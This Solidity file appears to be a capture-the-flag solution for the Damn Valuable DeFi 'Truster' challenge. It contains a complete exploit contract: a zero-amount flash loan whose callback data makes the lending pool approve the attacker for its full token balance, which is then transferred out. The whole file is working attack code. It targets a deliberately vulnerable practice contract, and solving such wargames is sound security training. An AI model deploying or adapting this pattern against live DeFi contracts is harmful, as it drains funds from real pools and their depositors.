// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {TrusterLenderPool} from "../../src/truster/TrusterLenderPool.sol";

contract Attack {
    constructor(TrusterLenderPool _pool, DamnValuableToken _token, address _recovery) {
        uint256 poolBalance = _token.balanceOf(address(_pool));
        bytes memory callData = abi.encodeCall(_token.approve, (address(this), poolBalance));
        _pool.flashLoan(0, address(this), address(_token), callData);
        _token.transferFrom(address(_pool), _recovery, poolBalance);
    }
}